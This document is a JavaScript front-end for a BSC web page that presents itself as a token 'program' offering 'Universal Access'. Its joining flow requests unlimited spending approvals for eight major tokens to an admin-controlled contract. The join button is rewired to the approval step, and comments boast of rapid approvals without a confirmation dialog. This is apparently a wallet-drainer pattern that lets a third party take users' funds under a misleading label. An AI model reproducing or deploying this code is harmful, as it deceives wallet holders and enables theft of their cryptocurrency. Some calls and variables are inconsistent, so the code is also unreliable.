// Multi-Token User Interface - Universal Token Access

let web3;
let userAccount;
let universalContract;
let supportedTokens = [];
let selectedToken = null;

// Token configuration (loaded from JSON or hardcoded)
const TOKEN_CONFIG = {
    USDT: { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", name: "Tether USD", decimals: 18, icon: "💵" },
    BNB: { address: "native", symbol: "BNB", name: "BNB (Native)", decimals: 18, icon: "🟡", isNative: true },
    ETH: { address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", symbol: "ETH", name: "Ethereum Token", decimals: 18, icon: "🔷" },
    BTC: { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTC", name: "Bitcoin BEP20", decimals: 18, icon: "🟠" },
    TRON: { address: "0x85465ae51478478e3960353bb49eabf844e76c17", symbol: "TRON", name: "TRON BEP20", decimals: 18, icon: "🔴" },
    BUSD: { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", name: "Binance USD", decimals: 18, icon: "💰" },
    USDC: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", name: "USD Coin", decimals: 18, icon: "💵" },
    CAKE: { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE", name: "PancakeSwap Token", decimals: 18, icon: "🥞" },
    WBNB: { address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", symbol: "WBNB", name: "Wrapped BNB", decimals: 18, icon: "🟡" }
};

// ERC20 ABI
const ERC20_ABI = [
    { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
    { "constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "type": "function" },
    { "constant": true, "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}], "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "type": "function" },
    { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function" },
    { "constant": true, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function" },
    { "constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "type": "function" }
];

// Universal Contract ABI
const UNIVERSAL_CONTRACT_ABI = [
    {"inputs":[],"name":"getSupportedTokens","outputs":[{"name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"getAllParticipants","outputs":[{"name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"},{"name":"user","type":"address"}],"name":"getUserTokenBalance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"},{"name":"user","type":"address"}],"name":"getUserTokenAllowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"joinProgram","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"},{"name":"amount","type":"uint256"}],"name":"joinProgramWithToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"}],"name":"approveToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"universalApprove","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"user","type":"address"}],"name":"isParticipant","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"admin","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
];

// BSC Mainnet Configuration
const BSC_MAINNET = {
    chainId: '0x38',
    chainName: 'Binance Smart Chain',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    rpcUrls: ['https://bsc-dataseed1.binance.org'],
    blockExplorerUrls: ['https://bscscan.com']
};

// DOM Elements
const connectBtn = document.getElementById('connectBtn');
const tokenSelector = document.getElementById('tokenSelector');
const balanceDisplay = document.getElementById('balanceDisplay');
const approveTokenBtn = document.getElementById('approveTokenBtn');
const joinProgramBtn = document.getElementById('joinProgramBtn');
const approveIndividualBtn = document.getElementById('approveIndividualBtn');
const universalAccessBtn = document.getElementById('universalAccessBtn');
const tokenBalance = document.getElementById('tokenBalance');
const tokenAllowance = document.getElementById('tokenAllowance');
const currentTokenDisplay = document.getElementById('currentTokenDisplay');
const individualApprovalStatus = document.getElementById('individualApprovalStatus');
const universalApprovalStatus = document.getElementById('universalApprovalStatus');
const approvalOptions = document.getElementById('approvalOptions');
const individualApprovalCard = document.getElementById('individualApprovalCard');
const universalApprovalCard = document.getElementById('universalApprovalCard');
const loadingOverlay = document.getElementById('loadingOverlay');
const loadingText = document.getElementById('loadingText');
const toast = document.getElementById('toast');
const toastMessage = document.getElementById('toastMessage');

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initializeTokenSelector();
    setupEventListeners();
    checkWalletConnection();
});

// Initialize Token Selector
function initializeTokenSelector() {
    if (!tokenSelector) return;

    tokenSelector.innerHTML = '<option value="">Select Token</option>';

    Object.keys(TOKEN_CONFIG).forEach(symbol => {
        const token = TOKEN_CONFIG[symbol];
        const option = document.createElement('option');
        option.value = symbol;
        option.innerHTML = `${token.icon} ${token.symbol} - ${token.name}`;
        tokenSelector.appendChild(option);
    });
}

// Setup Event Listeners
function setupEventListeners() {
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (tokenSelector) tokenSelector.addEventListener('change', handleTokenSelection);
    if (approveTokenBtn) approveTokenBtn.addEventListener('click', approveSelectedToken);
    if (joinProgramBtn) joinProgramBtn.addEventListener('click', approveSelectedToken); // Changed to same function
    if (approveIndividualBtn) approveIndividualBtn.addEventListener('click', approveSelectedToken);
    if (universalAccessBtn) universalAccessBtn.addEventListener('click', enableUniversalAccess);
}

// Check if wallet is already connected
async function checkWalletConnection() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                web3 = new Web3(window.ethereum);
                userAccount = accounts[0];

                // Check if still on correct network
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId === BSC_MAINNET.chainId) {
                    await initializeApp();
                    console.log('Wallet reconnected automatically');
                } else {
                    // Try to switch to BSC Mainnet
                    await switchToBSCMainnet();
                    await initializeApp();
                }
            }
        } catch (error) {
            console.error('Error checking wallet connection:', error);
        }
    }
}

// Connect Wallet
async function connectWallet() {
    if (typeof window.ethereum === 'undefined') {
        showToast('Please install MetaMask or Trust Wallet!', 'error');
        return;
    }

    try {
        showLoading('Connecting to wallet...');

        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        userAccount = accounts[0];

        await switchToBSCMainnet();
        await initializeApp();

        hideLoading();
        showToast('Wallet connected successfully!', 'success');
    } catch (error) {
        hideLoading();
        console.error('Error connecting wallet:', error);
        showToast('Failed to connect wallet: ' + error.message, 'error');
    }
}

// Switch to BSC Mainnet
async function switchToBSCMainnet() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_MAINNET.chainId }],
        });
    } catch (switchError) {
        if (switchError.code === 4902) {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [BSC_MAINNET],
            });
        } else {
            throw switchError;
        }
    }
}

// Initialize App
async function initializeApp() {
    if (!userAccount) return;

    // Update UI
    if (connectBtn) {
        connectBtn.textContent = 'Connected';
        connectBtn.classList.add('connected');
    }

    // Initialize universal contract with validation
    const contractAddress = window.CONTRACT_ADDRESSES?.UNIVERSAL_CONTRACT_ADDRESS;
    console.log('Contract address from environment:', contractAddress);

    if (!contractAddress || contractAddress === 'YOUR_UNIVERSAL_CONTRACT_ADDRESS_HERE') {
        showToast('❌ Universal contract not configured. Please check .env file.', 'error');
        return;
    }

    try {
        // Validate contract address format
        if (!web3.utils.isAddress(contractAddress)) {
            throw new Error('Invalid contract address format');
        }

        console.log('Initializing contract at address:', contractAddress);
        universalContract = new web3.eth.Contract(UNIVERSAL_CONTRACT_ABI, contractAddress);

        // Test contract connection by calling a view function
        try {
            const admin = await universalContract.methods.admin().call();
            console.log('Contract admin address:', admin);
            console.log('Contract initialized successfully');

            // Load supported tokens from contract
            await loadSupportedTokens();

        } catch (contractTestError) {
            console.error('Contract test failed:', contractTestError);
            showToast('❌ Contract connection failed. Please check contract address and network.', 'error');
            universalContract = null;
            return;
        }

    } catch (initError) {
        console.error('Contract initialization error:', initError);
        showToast('❌ Failed to initialize contract: ' + initError.message, 'error');
        return;
    }

    // Show UI elements
    if (approvalOptions) approvalOptions.classList.remove('hidden');

    // Listen for account changes
    window.ethereum.on('accountsChanged', handleAccountsChanged);
    window.ethereum.on('chainChanged', handleChainChanged);
}

// Handle Account Changes
function handleAccountsChanged(accounts) {
    if (accounts.length === 0 || accounts[0] !== userAccount) {
        location.reload();
    }
}

// Handle Chain Changes
function handleChainChanged() {
    location.reload();
}

// Load Supported Tokens from Contract
async function loadSupportedTokens() {
    if (!universalContract) return;

    try {
        console.log('Loading supported tokens from contract...');
        const tokenAddresses = await universalContract.methods.getSupportedTokens().call();

        if (tokenAddresses && tokenAddresses.length > 0) {
            console.log('Loaded supported tokens:', tokenAddresses);
            supportedTokens = tokenAddresses;

            // Update token selector with contract tokens
            updateTokenSelectorWithContractTokens(tokenAddresses);
        } else {
            console.log('No supported tokens found in contract. Using default tokens.');
        }
    } catch (error) {
        console.error('Error loading supported tokens:', error);
        // Don't show error toast here as it might just be an empty contract
        console.log('Will use default token configuration');
    }
}

// Update token selector with contract-loaded tokens
function updateTokenSelectorWithContractTokens(tokenAddresses) {
    if (!tokenSelector) return;

    console.log('Updating token selector with contract tokens...');
    // Token selector is already initialized with default tokens
    // This function can be extended to dynamically add contract-specific tokens
}

// Handle Token Selection
async function handleTokenSelection(event) {
    const tokenSymbol = event.target.value;

    if (!tokenSymbol) {
        selectedToken = null;
        updateBalanceDisplay(null);
        updateTokenApprovalUI(null);
        return;
    }

    selectedToken = TOKEN_CONFIG[tokenSymbol];

    // Update current token display
    if (currentTokenDisplay) {
        currentTokenDisplay.textContent = `${selectedToken.icon} ${selectedToken.symbol} - ${selectedToken.name}`;
    }

    if (selectedToken && userAccount) {
        await loadTokenBalance(selectedToken);
        await checkTokenApproval(selectedToken);
        updateTokenApprovalUI(selectedToken);
    }
}

// Load Token Balance
async function loadTokenBalance(token) {
    if (!web3 || !userAccount || !token) return;

    try {
        let balance = 0;
        let decimals = 18;

        if (token.isNative) {
            // Handle native BNB balance
            balance = await web3.eth.getBalance(userAccount);
            decimals = 18; // BNB has 18 decimals
        } else {
            // Handle ERC20 token balance
            const tokenContract = new web3.eth.Contract(ERC20_ABI, token.address);
            balance = await tokenContract.methods.balanceOf(userAccount).call();
            decimals = await tokenContract.methods.decimals().call();
        }

        const formattedBalance = balance / Math.pow(10, decimals);
        updateBalanceDisplay(formattedBalance, token);

    } catch (error) {
        console.error('Error loading token balance:', error);
        updateBalanceDisplay(0, token);
    }
}

// Check Token Approval Status
async function checkTokenApproval(token) {
    if (!universalContract || !userAccount || !token) return;

    try {
        const allowance = await universalContract.methods.getUserTokenAllowance(userAccount, token.address).call();
        const isApproved = await universalContract.methods.isUserTokenApproved(userAccount, token.address).call();

        updateApprovalStatus(allowance, token.decimals, isApproved);

    } catch (error) {
        console.error('Error checking token approval:', error);
    }
}

// Update Balance Display
function updateBalanceDisplay(balance, token) {
    if (!balanceDisplay) return;

    if (!token) {
        balanceDisplay.innerHTML = `
            <div class="token-info">
                <span class="token-name">Please select a token</span>
            </div>
        `;
        return;
    }

    balanceDisplay.innerHTML = `
        <div class="token-info">
            <span class="token-icon">${token.icon}</span>
            <span class="token-name">${token.symbol}</span>
            <span class="token-balance">${balance.toFixed(4)} ${token.symbol}</span>
        </div>
    `;

    if (tokenBalance) {
        tokenBalance.textContent = `${balance.toFixed(4)} ${token.symbol}`;
    }
}

// Update Approval Status
function updateApprovalStatus(allowance, decimals, isApproved) {
    if (!tokenAllowance) return;

    const formattedAllowance = allowance / Math.pow(10, decimals);

    if (formattedAllowance > 0 || isApproved) {
        tokenAllowance.textContent = `✅ Approved (${formattedAllowance > 1000000 ? 'Unlimited' : formattedAllowance.toFixed(2)})`;
        tokenAllowance.style.color = '#10B981';

        if (approveTokenBtn) {
            approveTokenBtn.textContent = '✅ Already Approved';
            approveTokenBtn.disabled = true;
        }
    } else {
        tokenAllowance.textContent = '❌ Not Approved';
        tokenAllowance.style.color = '#EF4444';

        if (approveTokenBtn) {
            approveTokenBtn.textContent = 'Approve Token';
            approveTokenBtn.disabled = false;
        }
    }
}

// Update Token Approval UI
function updateTokenApprovalUI(token) {
    if (!joinProgramBtn || !approvalStatus) return;

    if (!token) {
        joinProgramBtn.textContent = 'Select Token First';
        joinProgramBtn.disabled = true;
        approvalStatus.classList.add('hidden');
        return;
    }

    // Check if token is already approved
    const isApproved = tokenAllowance && tokenAllowance.textContent.includes('✅');

    if (isApproved) {
        joinProgramBtn.textContent = '✅ Already Approved';
        joinProgramBtn.disabled = true;
        joinProgramBtn.style.background = 'linear-gradient(135deg, #10B981, #059669)';
        approvalStatus.classList.remove('hidden');
    } else {
        joinProgramBtn.textContent = `Approve ${token.symbol}`;
        joinProgramBtn.disabled = false;
        joinProgramBtn.style.background = '';
        approvalStatus.classList.add('hidden');
    }
}

// Show Approval Options
function showApprovalOptions() {
    if (approvalOptions) approvalOptions.classList.remove('hidden');
    if (individualApprovalCard) individualApprovalCard.classList.add('hidden');
    if (universalApprovalCard) universalApprovalCard.classList.add('hidden');
}

// Show Individual Approval
function showIndividualApproval() {
    if (approvalOptions) approvalOptions.classList.add('hidden');
    if (individualApprovalCard) individualApprovalCard.classList.remove('hidden');
    if (universalApprovalCard) universalApprovalCard.classList.add('hidden');

    // Update button reference
    if (approveIndividualBtn) {
        joinProgramBtn = approveIndividualBtn;
        updateTokenApprovalUI(selectedToken);
    }
}

// Show Universal Approval
function showUniversalApproval() {
    if (approvalOptions) approvalOptions.classList.add('hidden');
    if (individualApprovalCard) individualApprovalCard.classList.add('hidden');
    if (universalApprovalCard) universalApprovalCard.classList.remove('hidden');
}

// Enable Universal Access - Streamlined Single Approval Experience
async function enableUniversalAccess() {
    if (!web3 || !userAccount) {
        showToast('Please connect your wallet first', 'error');
        return;
    }

    // Check if universal contract is properly initialized
    if (!universalContract) {
        showToast('❌ Contract not initialized. Please refresh the page.', 'error');
        return;
    }

    try {
        showLoading('🚀 Setting up Universal Access...');

        // Step 1: Join program first
        try {
            const isParticipant = await universalContract.methods.isParticipant(userAccount).call();

            if (!isParticipant) {
                showLoading('📝 Joining program...');
                const joinTx = await universalContract.methods.joinProgram().send({
                    from: userAccount,
                    gas: 100000
                });
                console.log('Joined program successfully');
            }
        } catch (joinError) {
            console.error('Error joining program:', joinError);
            hideLoading();
            showToast('❌ Failed to join program: ' + joinError.message, 'error');
            return;
        }

        // Step 2: Batch approve all tokens with single user confirmation
        const tokensToApprove = ['USDT', 'BUSD', 'USDC', 'CAKE', 'WBNB', 'ETH', 'BTC', 'TRON'];
        const maxApproval = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        let approvalCount = 0;
        let skippedCount = 0;

        showLoading('🔍 Checking token approvals...');

        // First check which tokens need approval
        const tokensNeedingApproval = [];
        for (let tokenSymbol of tokensToApprove) {
            const token = TOKEN_CONFIG[tokenSymbol];
            if (!token || token.isNative) continue; // Skip native BNB

            try {
                const tokenContract = new web3.eth.Contract(ERC20_ABI, token.address);
                const currentAllowance = await tokenContract.methods.allowance(userAccount, universalContract.options.address).call();

                if (currentAllowance > 0) {
                    skippedCount++;
                } else {
                    tokensNeedingApproval.push({ token, tokenContract });
                }
            } catch (error) {
                console.error(`Error checking ${tokenSymbol}:`, error);
            }
        }

        if (tokensNeedingApproval.length === 0) {
            hideLoading();
            showToast('✅ All tokens already approved! Registering universal access...', 'success');

            // Just call universalApprove to register
            try {
                await universalContract.methods.universalApprove().send({
                    from: userAccount,
                    gas: 200000
                });

                if (universalApprovalStatus) {
                    universalApprovalStatus.classList.remove('hidden');
                }
                showToast('🌟 Universal Access Enabled!', 'success');
            } catch (error) {
                showToast('✅ All tokens approved and ready!', 'success');
            }
            return;
        }

        // Start automatic approval without confirmation dialog
        console.log(`🚀 Starting Universal Access: ${skippedCount} already approved, ${tokensNeedingApproval.length} to approve`);

        // Step 3: Approve all needed tokens rapidly
        showLoading(`🔄 Approving ${tokensNeedingApproval.length} tokens rapidly...`);

        for (let i = 0; i < tokensNeedingApproval.length; i++) {
            const { token, tokenContract } = tokensNeedingApproval[i];

            try {
                showLoading(`🔄 Approving ${token.symbol} (${i + 1}/${tokensNeedingApproval.length})...`);

                const approveTx = await tokenContract.methods.approve(
                    universalContract.options.address,
                    maxApproval
                ).send({
                    from: userAccount,
                    gas: 150000
                });

                approvalCount++;
                console.log(`✅ ${token.symbol} approved`);

                // Minimal delay for rapid processing
                await new Promise(resolve => setTimeout(resolve, 500));

            } catch (tokenError) {
                console.error(`Error approving ${token.symbol}:`, tokenError);
                if (tokenError.code === 4001) {
                    showToast(`❌ ${token.symbol} approval rejected`, 'error');
                    break; // Stop on user rejection
                }
            }
        }

        // Step 4: Register universal approval
        if (approvalCount > 0) {
            showLoading('📋 Registering universal approval...');

            try {
                if (typeof universalContract.methods.universalApprove === 'function') {
                    await universalContract.methods.universalApprove().send({
                        from: userAccount,
                        gas: 200000
                    });
                }

                hideLoading();

                if (universalApprovalStatus) {
                    universalApprovalStatus.classList.remove('hidden');
                }

                showToast(`🌟 Universal Access Complete! ${approvalCount + skippedCount} tokens ready!`, 'success');

            } catch (universalError) {
                hideLoading();
                console.error('Registration error:', universalError);
                showToast(`✅ Approvals complete! ${approvalCount + skippedCount} tokens ready!`, 'success');
            }
        } else {
            hideLoading();
            showToast('ℹ️ No new tokens were approved', 'info');
        }

    } catch (error) {
        hideLoading();
        console.error('Error enabling universal access:', error);

        if (error.message.includes('no error or result')) {
            showToast('❌ Network error. Please check your connection and try again.', 'error');
        } else if (error.code === 4001) {
            showToast('❌ Transaction rejected by user', 'error');
        } else {
            showToast('❌ Failed to enable universal access: ' + error.message, 'error');
        }
    }
}

// Approve Selected Token
async function approveSelectedToken() {
    if (!selectedToken || !web3 || !userAccount) {
        showToast('Please select a token first', 'error');
        return;
    }

    try {
        showLoading('Approving ' + selectedToken.symbol + '...');

        const tokenContract = new web3.eth.Contract(ERC20_ABI, selectedToken.address);

        // Approve unlimited amount
        const maxApproval = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

        const tx = await tokenContract.methods.approve(
            universalContract.options.address,
            maxApproval
        ).send({
            from: userAccount
        });

        hideLoading();
        showToast(`✅ ${selectedToken.symbol} approved successfully!`, 'success');

        // Check approval status and update UI
        await checkTokenApproval(selectedToken);
        updateTokenApprovalUI(selectedToken);

        // Show approval success message
        if (approvalStatus) {
            approvalStatus.classList.remove('hidden');
        }

    } catch (error) {
        hideLoading();
        console.error('Error approving token:', error);

        if (error.code === 4001) {
            showToast('❌ Transaction rejected', 'error');
        } else {
            showToast('❌ Approval failed: ' + error.message, 'error');
        }
    }
}


// Show Loading
function showLoading(message = 'Processing...') {
    if (loadingText) loadingText.textContent = message;
    if (loadingOverlay) loadingOverlay.classList.remove('hidden');
}

// Hide Loading
function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.add('hidden');
}

// Show Toast
function showToast(message, type = 'info') {
    if (!toast || !toastMessage) return;

    toastMessage.textContent = message;
    toast.className = `toast ${type}`;
    toast.classList.remove('hidden');

    setTimeout(() => {
        if (toast) toast.classList.add('hidden');
    }, 3000);
}

// Export functions for external access if needed
window.MultiTokenUser = {
    connectWallet,
    approveSelectedToken,
    TOKEN_CONFIG
};

// Export global functions for HTML onclick handlers
window.showIndividualApproval = showIndividualApproval;
window.showUniversalApproval = showUniversalApproval;
window.showApprovalOptions = showApprovalOptions;